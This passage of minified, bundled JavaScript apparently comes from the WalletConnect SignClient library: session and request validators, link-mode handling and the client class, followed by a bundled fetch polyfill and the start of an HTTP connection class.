new Error(`Scoped properties must be a subset of required/optional namespaces, received: ${JSON.stringify(a)}, required/optional namespaces: ${JSON.stringify(l)}`)}}),J(this,"validateNamespaces",(r,n)=>{const i=F$(r,"connect()",n);if(i)throw new Error(i.message)}),J(this,"isValidApprove",async r=>{if(!Fr(r))throw new Error(ee("MISSING_OR_INVALID",`approve() params: ${r}`).message);const{id:n,namespaces:i,relayProtocol:s,sessionProperties:o,scopedProperties:a}=r;this.checkRecentlyDeleted(n),await this.isValidProposalId(n);const c=this.client.proposal.get(n),l=iw(i,"approve()");if(l)throw new Error(l.message);const u=U3(c.requiredNamespaces,i,"approve()");if(u)throw new Error(u.message);if(!Tt(s,!0)){const{message:h}=ee("MISSING_OR_INVALID",`approve() relayProtocol: ${s}`);throw new Error(h)}if(ir(o)||this.validateSessionProps(o,"sessionProperties"),!ir(a)){this.validateSessionProps(a,"scopedProperties");const h=new Set(Object.keys(i));if(!Object.keys(a).every(d=>h.has(d)))throw new Error(`Scoped properties must be a subset of approved namespaces, received: ${JSON.stringify(a)}, approved namespaces: ${Array.from(h).join(", ")}`)}}),J(this,"isValidReject",async r=>{if(!Fr(r)){const{message:s}=ee("MISSING_OR_INVALID",`reject() params: ${r}`);throw new Error(s)}const{id:n,reason:i}=r;if(this.checkRecentlyDeleted(n),await this.isValidProposalId(n),!H$(i)){const{message:s}=ee("MISSING_OR_INVALID",`reject() reason: ${JSON.stringify(i)}`);throw new Error(s)}}),J(this,"isValidSessionSettleRequest",r=>{if(!Fr(r)){const{message:l}=ee("MISSING_OR_INVALID",`onSessionSettleRequest() params: ${r}`);throw new Error(l)}const{relay:n,controller:i,namespaces:s,expiry:o}=r;if(!OC(n)){const{message:l}=ee("MISSING_OR_INVALID","onSessionSettleRequest() relay protocol should be a string");throw new Error(l)}const a=R$(i,"onSessionSettleRequest()");if(a)throw new Error(a.message);const c=iw(s,"onSessionSettleRequest()");if(c)throw new Error(c.message);if(co(o)){const{message:l}=ee("EXPIRED","onSessionSettleRequest()");throw new Error(l)}}),J(this,"isValidUpdate",async r=>{if(!Fr(r)){const{message:c}=ee("MISSING_OR_INVALID",`update() params: ${r}`);throw new Error(c)}const{topic:n,namespaces:i}=r;this.checkRecentlyDeleted(n),await this.isValidSessionTopic(n);const s=this.client.session.get(n),o=iw(i,"update()");if(o)throw new Error(o.message);const a=U3(s.requiredNamespaces,i,"update()");if(a)throw new Error(a.message)}),J(this,"isValidExtend",async r=>{if(!Fr(r)){const{message:i}=ee("MISSING_OR_INVALID",`extend() params: ${r}`);throw new Error(i)}const{topic:n}=r;this.checkRecentlyDeleted(n),await this.isValidSessionTopic(n)}),J(this,"isValidRequest",async r=>{if(!Fr(r)){const{message:c}=ee("MISSING_OR_INVALID",`request() params: ${r}`);throw new Error(c)}const{topic:n,request:i,chainId:s,expiry:o}=r;this.checkRecentlyDeleted(n),await this.isValidSessionTopic(n);const{namespaces:a}=this.client.session.get(n);if(!L3(a,s)){const{message:c}=ee("MISSING_OR_INVALID",`request() chainId: ${s}`);throw new Error(c)}if(!q$(i)){const{message:c}=ee("MISSING_OR_INVALID",`request() ${JSON.stringify(i)}`);throw new Error(c)}if(!G$(a,s,i.method)){const{message:c}=ee("MISSING_OR_INVALID",`request() method: ${i.method}`);throw new Error(c)}if(o&&!Q$(o,ww)){const{message:c}=ee("MISSING_OR_INVALID",`request() expiry: ${o}. Expiry must be a number (in seconds) between ${ww.min} and ${ww.max}`);throw new Error(c)}}),J(this,"isValidRespond",async r=>{var n;if(!Fr(r)){const{message:o}=ee("MISSING_OR_INVALID",`respond() params: ${r}`);throw new Error(o)}const{topic:i,response:s}=r;try{await this.isValidSessionTopic(i)}catch(o){throw(n=r==null?void 0:r.response)!=null&&n.id&&this.cleanupAfterResponse(r),o}if(!V$(s)){const{message:o}=ee("MISSING_OR_INVALID",`respond() response: ${JSON.stringify(s)}`);throw new Error(o)}}),J(this,"isValidPing",async r=>{if(!Fr(r)){const{message:i}=ee("MISSING_OR_INVALID",`ping() params: ${r}`);throw new Error(i)}const{topic:n}=r;await this.isValidSessionOrPairingTopic(n)}),J(this,"isValidEmit",async r=>{if(!Fr(r)){const{message:a}=ee("MISSING_OR_INVALID",`emit() params: ${r}`);throw new Error(a)}const{topic:n,event:i,chainId:s}=r;await this.isValidSessionTopic(n);const{namespaces:o}=this.client.session.get(n);if(!L3(o,s)){const{message:a}=ee("MISSING_OR_INVALID",`emit() chainId: ${s}`);throw new Error(a)}if(!W$(i)){const{message:a}=ee("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(a)}if(!K$(o,s,i.name)){const{message:a}=ee("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(a)}}),J(this,"isValidDisconnect",async r=>{if(!Fr(r)){const{message:i}=ee("MISSING_OR_INVALID",`disconnect() params: ${r}`);throw new Error(i)}const{topic:n}=r;await this.isValidSessionOrPairingTopic(n)}),J(this,"isValidAuthenticate",r=>{const{chains:n,uri:i,domain:s,nonce:o}=r;if(!Array.isArray(n)||n.length===0)throw new Error("chains is required and must be a non-empty array");if(!Tt(i,!1))throw new Error("uri is required parameter");if(!Tt(s,!1))throw new Error("domain is required parameter");if(!Tt(o,!1))throw new Error("nonce is required parameter");if([...new Set(n.map(c=>Hl(c).namespace))].length>1)throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");const{namespace:a}=Hl(n[0]);if(a!=="eip155")throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")}),J(this,"getVerifyContext",async r=>{const{attestationId:n,hash:i,encryptedId:s,metadata:o,transportType:a}=r,c={verified:{verifyUrl:o.verifyUrl||Cd,validation:"UNKNOWN",origin:o.url||""}};try{if(a===mt.link_mode){const u=this.getAppLinkIfEnabled(o,a);return c.verified.validation=u&&new URL(u).origin===new URL(o.url).origin?"VALID":"INVALID",c}const l=await this.client.core.verify.resolve({attestationId:n,hash:i,encryptedId:s,verifyUrl:o.verifyUrl});l&&(c.verified.origin=l.origin,c.verified.isScam=l.isScam,c.verified.validation=l.origin===new URL(o.url).origin?"VALID":"INVALID")}catch(l){this.client.logger.warn(l)}return this.client.logger.debug(`Verify context: ${JSON.stringify(c)}`),c}),J(this,"validateSessionProps",(r,n)=>{Object.values(r).forEach((i,s)=>{if(i==null){const{message:o}=ee("MISSING_OR_INVALID",`${n} must contain an existing value for each key. Received: ${i} for key ${Object.keys(r)[s]}`);throw new Error(o)}})}),J(this,"getPendingAuthRequest",r=>{const n=this.client.auth.requests.get(r);return typeof n=="object"?n:void 0}),J(this,"addToRecentlyDeleted",(r,n)=>{if(this.recentlyDeletedMap.set(r,n),this.recentlyDeletedMap.size>=this.recentlyDeletedLimit){let i=0;const s=this.recentlyDeletedLimit/2;for(const o of this.recentlyDeletedMap.keys()){if(i++>=s)break;this.recentlyDeletedMap.delete(o)}}}),J(this,"checkRecentlyDeleted",r=>{const n=this.recentlyDeletedMap.get(r);if(n){const{message:i}=ee("MISSING_OR_INVALID",`Record was recently deleted - ${n}: ${r}`);throw new Error(i)}}),J(this,"isLinkModeEnabled",(r,n)=>{var i,s,o,a,c,l,u,h,d;return!r||n!==mt.link_mode?!1:((s=(i=this.client.metadata)==null?void 0:i.redirect)==null?void 0:s.linkMode)===!0&&((a=(o=this.client.metadata)==null?void 0:o.redirect)==null?void 0:a.universal)!==void 0&&((l=(c=this.client.metadata)==null?void 0:c.redirect)==null?void 0:l.universal)!==""&&((u=r==null?void 0:r.redirect)==null?void 0:u.universal)!==void 0&&((h=r==null?void 0:r.redirect)==null?void 0:h.universal)!==""&&((d=r==null?void 0:r.redirect)==null?void 0:d.linkMode)===!0&&this.client.core.linkModeSupportedApps.includes(r.redirect.universal)&&typeof(global==null?void 0:global.Linking)<"u"}),J(this,"getAppLinkIfEnabled",(r,n)=>{var i;return this.isLinkModeEnabled(r,n)?(i=r==null?void 0:r.redirect)==null?void 0:i.universal:void 0}),J(this,"handleLinkModeMessage",({url:r})=>{if(!r||!r.includes("wc_ev")||!r.includes("topic"))return;const n=r3(r,"topic")||"",i=decodeURIComponent(r3(r,"wc_ev")||""),s=this.client.session.keys.includes(n);s&&this.client.session.update(n,{transportType:mt.link_mode}),this.client.core.dispatchEnvelope({topic:n,message:i,sessionExists:s})}),J(this,"registerLinkModeListeners",async()=>{var r;if(Fb()||Go()&&(r=this.client.metadata.redirect)!=null&&r.linkMode){const n=global==null?void 0:global.Linking;if(typeof n<"u"){n.addEventListener("url",this.handleLinkModeMessage,this.client.name);const i=await n.getInitialURL();i&&setTimeout(()=>{this.handleLinkModeMessage({url:i})},50)}}}),J(this,"shouldSetTVF",(r,n)=>{if(!n||r!=="wc_sessionRequest")return!1;const{request:i}=n;return Object.keys($5).includes(i.method)}),J(this,"getTVFParams",(r,n,i)=>{var s,o;try{const a=n.request.method,c=this.extractTxHashesFromResult(a,i);return br(lt({correlationId:r,rpcMethods:[a],chainId:n.chainId},this.isValidContractData(n.request.params)&&{contractAddresses:[(o=(s=n.request.params)==null?void 0:s[0])==null?void 0:o.to]}),{txHashes:c})}catch(a){this.client.logger.warn("Error getting TVF params",a)}return{}}),J(this,"isValidContractData",r=>{var n;if(!r)return!1;try{const i=(r==null?void 0:r.data)||((n=r==null?void 0:r[0])==null?void 0:n.data);if(!i.startsWith("0x"))return!1;const s=i.slice(2);return/^[0-9a-fA-F]*$/.test(s)?s.length%2===0:!1}catch{}return!1}),J(this,"extractTxHashesFromResult",(r,n)=>{try{const i=$5[r];if(typeof n=="string")return[n];const s=n[i.key];if(hi(s))return r==="solana_signAllTransactions"?s.map(o=>I_(o)):s;if(typeof s=="string")return[s]}catch(i){this.client.logger.warn("Error extracting tx hashes from result",i)}return[]})}async processPendingMessageEvents(){try{const e=this.client.session.keys,r=this.client.core.relayer.messages.getWithoutAck(e);for(const[n,i]of Object.entries(r))for(const s of i)try{await this.onProviderMessageEvent({topic:n,message:s,publishedAt:Date.now()})}catch{this.client.logger.warn(`Error processing pending message event for topic: ${n}, message: ${s}`)}}catch(e){this.client.logger.warn("processPendingMessageEvents failed",e)}}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}async confirmOnlineStateOrThrow(){await this.client.core.relayer.confirmOnlineStateOrThrow()}registerRelayerEvents(){this.client.core.relayer.on(Kt.message,e=>{this.onProviderMessageEvent(e)})}async onRelayMessage(e){const{topic:r,message:n,attestation:i,transportType:s}=e,{publicKey:o}=this.client.auth.authKeys.keys.includes(D0)?this.client.auth.authKeys.get(D0):{publicKey:void 0};try{const a=await this.client.core.crypto.decode(r,n,{receiverPublicKey:o,encoding:s===mt.link_mode?fo:ui});Qb(a)?(this.client.core.history.set(r,a),await this.onRelayEventRequest({topic:r,payload:a,attestation:i,transportType:s,encryptedId:Fi(n)})):Yg(a)?(await this.client.core.history.resolve(a),await this.onRelayEventResponse({topic:r,payload:a,transportType:s}),this.client.core.history.delete(r,a.id)):await this.onRelayEventUnknownPayload({topic:r,payload:a,transportType:s}),await this.client.core.relayer.messages.ack(r,n)}catch(a){this.client.logger.error(a)}}registerExpirerEvents(){this.client.core.expirer.on(Tn.expired,async e=>{const{topic:r,id:n}=ZE(e.target);if(n&&this.client.pendingRequest.keys.includes(n))return await this.deletePendingSessionRequest(n,ee("EXPIRED"),!0);if(n&&this.client.auth.requests.keys.includes(n))return await this.deletePendingAuthRequest(n,ee("EXPIRED"),!0);r?this.client.session.keys.includes(r)&&(await this.deleteSession({topic:r,expirerHasDeleted:!0}),this.client.events.emit("session_expire",{topic:r})):n&&(await this.deleteProposal(n,!0),this.client.events.emit("proposal_expire",{id:n}))})}registerPairingEvents(){this.client.core.pairing.events.on(xa.create,e=>this.onPairingCreated(e)),this.client.core.pairing.events.on(xa.delete,e=>{this.addToRecentlyDeleted(e.topic,"pairing")})}isValidPairingTopic(e){if(!Tt(e,!1)){const{message:r}=ee("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(r)}if(!this.client.core.pairing.pairings.keys.includes(e)){const{message:r}=ee("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(r)}if(co(this.client.core.pairing.pairings.get(e).expiry)){const{message:r}=ee("EXPIRED",`pairing topic: ${e}`);throw new Error(r)}}async isValidSessionTopic(e){if(!Tt(e,!1)){const{message:r}=ee("MISSING_OR_INVALID",`session topic should be a string: ${e}`);throw new Error(r)}if(this.checkRecentlyDeleted(e),!this.client.session.keys.includes(e)){const{message:r}=ee("NO_MATCHING_KEY",`session topic doesn't exist: ${e}`);throw new Error(r)}if(co(this.client.session.get(e).expiry)){await this.deleteSession({topic:e});const{message:r}=ee("EXPIRED",`session topic: ${e}`);throw new Error(r)}if(!this.client.core.crypto.keychain.has(e)){const{message:r}=ee("MISSING_OR_INVALID",`session topic does not exist in keychain: ${e}`);throw await this.deleteSession({topic:e}),new Error(r)}}async isValidSessionOrPairingTopic(e){if(this.checkRecentlyDeleted(e),this.client.session.keys.includes(e))await this.isValidSessionTopic(e);else if(this.client.core.pairing.pairings.keys.includes(e))this.isValidPairingTopic(e);else if(Tt(e,!1)){const{message:r}=ee("NO_MATCHING_KEY",`session or pairing topic doesn't exist: ${e}`);throw new Error(r)}else{const{message:r}=ee("MISSING_OR_INVALID",`session or pairing topic should be a string: ${e}`);throw new Error(r)}}async isValidProposalId(e){if(!j$(e)){const{message:r}=ee("MISSING_OR_INVALID",`proposal id should be a number: ${e}`);throw new Error(r)}if(!this.client.proposal.keys.includes(e)){const{message:r}=ee("NO_MATCHING_KEY",`proposal id doesn't exist: ${e}`);throw new Error(r)}if(co(this.client.proposal.get(e).expiryTimestamp)){await this.deleteProposal(e);const{message:r}=ee("EXPIRED",`proposal id: ${e}`);throw new Error(r)}}},VM=class extends Uc{constructor(e,r){super(e,r,kM,Yb),this.core=e,this.logger=r}},WM=class extends Uc{constructor(e,r){super(e,r,OM,Yb),this.core=e,this.logger=r}},GM=class extends Uc{constructor(e,r){super(e,r,TM,Yb,n=>n.id),this.core=e,this.logger=r}};class KM extends Uc{constructor(e,r){super(e,r,BM,e1,()=>D0),this.core=e,this.logger=r}}class ZM extends Uc{constructor(e,r){super(e,r,LM,e1),this.core=e,this.logger=r}}class JM extends Uc{constructor(e,r){super(e,r,UM,e1,n=>n.id),this.core=e,this.logger=r}}var QM=Object.defineProperty,YM=(t,e,r)=>e in t?QM(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,mw=(t,e,r)=>YM(t,typeof e!="symbol"?e+"":e,r);let XM=class{constructor(e,r){this.core=e,this.logger=r,mw(this,"authKeys"),mw(this,"pairingTopics"),mw(this,"requests"),this.authKeys=new KM(this.core,this.logger),this.pairingTopics=new ZM(this.core,this.logger),this.requests=new JM(this.core,this.logger)}async init(){await this.authKeys.init(),await this.pairingTopics.init(),await this.requests.init()}};var eF=Object.defineProperty,tF=(t,e,r)=>e in t?eF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,ze=(t,e,r)=>tF(t,typeof e!="symbol"?e+"":e,r);let rF=class iA extends ED{constructor(e){super(e),ze(this,"protocol",tA),ze(this,"version",rA),ze(this,"name",gw.name),ze(this,"metadata"),ze(this,"core"),ze(this,"logger"),ze(this,"events",new mn.EventEmitter),ze(this,"engine"),ze(this,"session"),ze(this,"proposal"),ze(this,"pendingRequest"),ze(this,"auth"),ze(this,"signConfig"),ze(this,"on",(n,i)=>this.events.on(n,i)),ze(this,"once",(n,i)=>this.events.once(n,i)),ze(this,"off",(n,i)=>this.events.off(n,i)),ze(this,"removeListener",(n,i)=>this.events.removeListener(n,i)),ze(this,"removeAllListeners",n=>this.events.removeAllListeners(n)),ze(this,"connect",async n=>{try{return await this.engine.connect(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"pair",async n=>{try{return await this.engine.pair(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"approve",async n=>{try{return await this.engine.approve(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"reject",async n=>{try{return await this.engine.reject(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"update",async n=>{try{return await this.engine.update(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"extend",async n=>{try{return await this.engine.extend(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"request",async n=>{try{return await this.engine.request(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"respond",async n=>{try{return await this.engine.respond(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"ping",async n=>{try{return await this.engine.ping(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"emit",async n=>{try{return await this.engine.emit(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"disconnect",async n=>{try{return await this.engine.disconnect(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"find",n=>{try{return this.engine.find(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"getPendingSessionRequests",()=>{try{return this.engine.getPendingSessionRequests()}catch(n){throw this.logger.error(n.message),n}}),ze(this,"authenticate",async(n,i)=>{try{return await this.engine.authenticate(n,i)}catch(s){throw this.logger.error(s.message),s}}),ze(this,"formatAuthMessage",n=>{try{return this.engine.formatAuthMessage(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"approveSessionAuthenticate",async n=>{try{return await this.engine.approveSessionAuthenticate(n)}catch(i){throw this.logger.error(i.message),i}}),ze(this,"rejectSessionAuthenticate",async n=>{try{return await this.engine.rejectSessionAuthenticate(n)}catch(i){throw this.logger.error(i.message),i}}),this.name=(e==null?void 0:e.name)||gw.name,this.metadata=UO(e==null?void 0:e.metadata),this.signConfig=e==null?void 0:e.signConfig;const r=typeof(e==null?void 0:e.logger)<"u"&&typeof(e==null?void 0:e.logger)!="string"?e.logger:Kf(Zg({level:(e==null?void 0:e.logger)||gw.logger}));this.core=(e==null?void 0:e.core)||new PM(e),this.logger=_r(r,this.name),this.session=new WM(this.core,this.logger),this.proposal=new VM(this.core,this.logger),this.pendingRequest=new GM(this.core,this.logger),this.engine=new qM(this),this.auth=new XM(this.core,this.logger)}static async init(e){const r=new iA(e);return await r.initialize(),r}get context(){return Jr(this.logger)}get pairing(){return this.core.pairing.pairings}async initialize(){this.logger.trace("Initialized");try{await this.core.start(),await this.session.init(),await this.proposal.init(),await this.pendingRequest.init(),await this.auth.init(),await this.engine.init(),this.logger.info("SignClient Initialization Success"),setTimeout(()=>{this.engine.processRelayMessageCache()},X.toMiliseconds(X.ONE_SECOND))}catch(e){throw this.logger.info("SignClient Initialization Failure"),this.logger.error(e.message),e}}};var xp={exports:{}},D5;function nF(){return D5||(D5=1,function(t,e){var r=typeof globalThis<"u"&&globalThis||typeof self<"u"&&self||typeof Mi<"u"&&Mi,n=function(){function s(){this.fetch=!1,this.DOMException=r.DOMException}return s.prototype=r,new s}();(function(s){(function(o){var a=typeof s<"u"&&s||typeof self<"u"&&self||typeof Mi<"u"&&Mi||{},c={searchParams:"URLSearchParams"in a,iterable:"Symbol"in a&&"iterator"in Symbol,blob:"FileReader"in a&&"Blob"in a&&function(){try{return new Blob,!0}catch{return!1}}(),formData:"FormData"in a,arrayBuffer:"ArrayBuffer"in a};function l(y){return y&&DataView.prototype.isPrototypeOf(y)}if(c.arrayBuffer)var u=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],h=ArrayBuffer.isView||function(y){return y&&u.indexOf(Object.prototype.toString.call(y))>-1};function d(y){if(typeof y!="string"&&(y=String(y)),/[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(y)||y==="")throw new TypeError('Invalid character in header field name: "'+y+'"');return y.toLowerCase()}function f(y){return typeof y!="string"&&(y=String(y)),y}function g(y){var E={next:function(){var k=y.shift();return{done:k===void 0,value:k}}};return c.iterable&&(E[Symbol.iterator]=function(){return E}),E}function p(y){this.map={},y instanceof p?y.forEach(function(E,k){this.append(k,E)},this):Array.isArray(y)?y.forEach(function(E){if(E.length!=2)throw new TypeError("Headers constructor: expected name/value pair to be length 2, found"+E.length);this.append(E[0],E[1])},this):y&&Object.getOwnPropertyNames(y).forEach(function(E){this.append(E,y[E])},this)}p.prototype.append=function(y,E){y=d(y),E=f(E);var k=this.map[y];this.map[y]=k?k+", "+E:E},p.prototype.delete=function(y){delete this.map[d(y)]},p.prototype.get=function(y){return y=d(y),this.has(y)?this.map[y]:null},p.prototype.has=function(y){return this.map.hasOwnProperty(d(y))},p.prototype.set=function(y,E){this.map[d(y)]=f(E)},p.prototype.forEach=function(y,E){for(var k in this.map)this.map.hasOwnProperty(k)&&y.call(E,this.map[k],k,this)},p.prototype.keys=function(){var y=[];return this.forEach(function(E,k){y.push(k)}),g(y)},p.prototype.values=function(){var y=[];return this.forEach(function(E){y.push(E)}),g(y)},p.prototype.entries=function(){var y=[];return this.forEach(function(E,k){y.push([k,E])}),g(y)},c.iterable&&(p.prototype[Symbol.iterator]=p.prototype.entries);function w(y){if(!y._noBody){if(y.bodyUsed)return Promise.reject(new TypeError("Already read"));y.bodyUsed=!0}}function m(y){return new Promise(function(E,k){y.onload=function(){E(y.result)},y.onerror=function(){k(y.error)}})}function b(y){var E=new FileReader,k=m(E);return E.readAsArrayBuffer(y),k}function v(y){var E=new FileReader,k=m(E),_=/charset=([A-Za-z0-9_-]+)/.exec(y.type),R=_?_[1]:"utf-8";return E.readAsText(y,R),k}function x(y){for(var E=new Uint8Array(y),k=new Array(E.length),_=0;_<E.length;_++)k[_]=String.fromCharCode(E[_]);return k.join("")}function I(y){if(y.slice)return y.slice(0);var E=new Uint8Array(y.byteLength);return E.set(new Uint8Array(y)),E.buffer}function C(){return this.bodyUsed=!1,this._initBody=function(y){this.bodyUsed=this.bodyUsed,this._bodyInit=y,y?typeof y=="string"?this._bodyText=y:c.blob&&Blob.prototype.isPrototypeOf(y)?this._bodyBlob=y:c.formData&&FormData.prototype.isPrototypeOf(y)?this._bodyFormData=y:c.searchParams&&URLSearchParams.prototype.isPrototypeOf(y)?this._bodyText=y.toString():c.arrayBuffer&&c.blob&&l(y)?(this._bodyArrayBuffer=I(y.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):c.arrayBuffer&&(ArrayBuffer.prototype.isPrototypeOf(y)||h(y))?this._bodyArrayBuffer=I(y):this._bodyText=y=Object.prototype.toString.call(y):(this._noBody=!0,this._bodyText=""),this.headers.get("content-type")||(typeof y=="string"?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):c.searchParams&&URLSearchParams.prototype.isPrototypeOf(y)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},c.blob&&(this.blob=function(){var y=w(this);if(y)return y;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))}),this.arrayBuffer=function(){if(this._bodyArrayBuffer){var y=w(this);return y||(ArrayBuffer.isView(this._bodyArrayBuffer)?Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset,this._bodyArrayBuffer.byteOffset+this._bodyArrayBuffer.byteLength)):Promise.resolve(this._bodyArrayBuffer))}else{if(c.blob)return this.blob().then(b);throw new Error("could not read as ArrayBuffer")}},this.text=function(){var y=w(this);if(y)return y;if(this._bodyBlob)return v(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(x(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},c.formData&&(this.formData=function(){return this.text().then(T)}),this.json=function(){return this.text().then(JSON.parse)},this}var N=["CONNECT","DELETE","GET","HEAD","OPTIONS","PATCH","POST","PUT","TRACE"];function S(y){var E=y.toUpperCase();return N.indexOf(E)>-1?E:y}function P(y,E){if(!(this instanceof P))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');E=E||{};var k=E.body;if(y instanceof P){if(y.bodyUsed)throw new TypeError("Already read");this.url=y.url,this.credentials=y.credentials,E.headers||(this.headers=new p(y.headers)),this.method=y.method,this.mode=y.mode,this.signal=y.signal,!k&&y._bodyInit!=null&&(k=y._bodyInit,y.bodyUsed=!0)}else this.url=String(y);if(this.credentials=E.credentials||this.credentials||"same-origin",(E.headers||!this.headers)&&(this.headers=new p(E.headers)),this.method=S(E.method||this.method||"GET"),this.mode=E.mode||this.mode||null,this.signal=E.signal||this.signal||function(){if("AbortController"in a){var L=new AbortController;return L.signal}}(),this.referrer=null,(this.method==="GET"||this.method==="HEAD")&&k)throw new TypeError("Body not allowed for GET or HEAD requests");if(this._initBody(k),(this.method==="GET"||this.method==="HEAD")&&(E.cache==="no-store"||E.cache==="no-cache")){var _=/([?&])_=[^&]*/;if(_.test(this.url))this.url=this.url.replace(_,"$1_="+new Date().getTime());else{var R=/\?/;this.url+=(R.test(this.url)?"&":"?")+"_="+new Date().getTime()}}}P.prototype.clone=function(){return new P(this,{body:this._bodyInit})};function T(y){var E=new FormData;return y.trim().split("&").forEach(function(k){if(k){var _=k.split("="),R=_.shift().replace(/\+/g," "),L=_.join("=").replace(/\+/g," ");E.append(decodeURIComponent(R),decodeURIComponent(L))}}),E}function D(y){var E=new p,k=y.replace(/\r?\n[\t ]+/g," ");return k.split("\r").map(function(_){return _.indexOf(`
`)===0?_.substr(1,_.length):_}).forEach(function(_){var R=_.split(":"),L=R.shift().trim();if(L){var q=R.join(":").trim();try{E.append(L,q)}catch(W){console.warn("Response "+W.message)}}}),E}C.call(P.prototype);function z(y,E){if(!(this instanceof z))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');if(E||(E={}),this.type="default",this.status=E.status===void 0?200:E.status,this.status<200||this.status>599)throw new RangeError("Failed to construct 'Response': The status provided (0) is outside the range [200, 599].");this.ok=this.status>=200&&this.status<300,this.statusText=E.statusText===void 0?"":""+E.statusText,this.headers=new p(E.headers),this.url=E.url||"",this._initBody(y)}C.call(z.prototype),z.prototype.clone=function(){return new z(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new p(this.headers),url:this.url})},z.error=function(){var y=new z(null,{status:200,statusText:""});return y.ok=!1,y.status=0,y.type="error",y};var V=[301,302,303,307,308];z.redirect=function(y,E){if(V.indexOf(E)===-1)throw new RangeError("Invalid status code");return new z(null,{status:E,headers:{location:y}})},o.DOMException=a.DOMException;try{new o.DOMException}catch{o.DOMException=function(E,k){this.message=E,this.name=k;var _=Error(E);this.stack=_.stack},o.DOMException.prototype=Object.create(Error.prototype),o.DOMException.prototype.constructor=o.DOMException}function O(y,E){return new Promise(function(k,_){var R=new P(y,E);if(R.signal&&R.signal.aborted)return _(new o.DOMException("Aborted","AbortError"));var L=new XMLHttpRequest;function q(){L.abort()}L.onload=function(){var G={statusText:L.statusText,headers:D(L.getAllResponseHeaders()||"")};R.url.indexOf("file://")===0&&(L.status<200||L.status>599)?G.status=200:G.status=L.status,G.url="responseURL"in L?L.responseURL:G.headers.get("X-Request-URL");var ne="response"in L?L.response:L.responseText;setTimeout(function(){k(new z(ne,G))},0)},L.onerror=function(){setTimeout(function(){_(new TypeError("Network request failed"))},0)},L.ontimeout=function(){setTimeout(function(){_(new TypeError("Network request timed out"))},0)},L.onabort=function(){setTimeout(function(){_(new o.DOMException("Aborted","AbortError"))},0)};function W(G){try{return G===""&&a.location.href?a.location.href:G}catch{return G}}if(L.open(R.method,W(R.url),!0),R.credentials==="include"?L.withCredentials=!0:R.credentials==="omit"&&(L.withCredentials=!1),"responseType"in L&&(c.blob?L.responseType="blob":c.arrayBuffer&&(L.responseType="arraybuffer")),E&&typeof E.headers=="object"&&!(E.headers instanceof p||a.Headers&&E.headers instanceof a.Headers)){var Z=[];Object.getOwnPropertyNames(E.headers).forEach(function(G){Z.push(d(G)),L.setRequestHeader(G,f(E.headers[G]))}),R.headers.forEach(function(G,ne){Z.indexOf(ne)===-1&&L.setRequestHeader(ne,G)})}else R.headers.forEach(function(G,ne){L.setRequestHeader(ne,G)});R.signal&&(R.signal.addEventListener("abort",q),L.onreadystatechange=function(){L.readyState===4&&R.signal.removeEventListener("abort",q)}),L.send(typeof R._bodyInit>"u"?null:R._bodyInit)})}return O.polyfill=!0,a.fetch||(a.fetch=O,a.Headers=p,a.Request=P,a.Response=z),o.Headers=p,o.Request=P,o.Response=z,o.fetch=O,Object.defineProperty(o,"__esModule",{value:!0}),o})({})})(n),n.fetch.ponyfill=!0,delete n.fetch.polyfill;var i=r.fetch?r:n;e=i.fetch,e.default=i.fetch,e.fetch=i.fetch,e.Headers=i.Headers,e.Request=i.Request,e.Response=i.Response,t.exports=e}(xp,xp.exports)),xp.exports}var iF=nF();const B5=_b(iF);var sF=Object.defineProperty,oF=Object.defineProperties,aF=Object.getOwnPropertyDescriptors,L5=Object.getOwnPropertySymbols,cF=Object.prototype.hasOwnProperty,lF=Object.prototype.propertyIsEnumerable,U5=(t,e,r)=>e in t?sF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,M5=(t,e)=>{for(var r in e||(e={}))cF.call(e,r)&&U5(t,r,e[r]);if(L5)for(var r of L5(e))lF.call(e,r)&&U5(t,r,e[r]);return t},F5=(t,e)=>oF(t,aF(e));const uF={Accept:"application/json","Content-Type":"application/json"},hF="POST",z5={headers:uF,method:hF},j5=10;let gi=class{constructor(e,r=!1){if(this.url=e,this.disableProviderPing=r,this.events=new 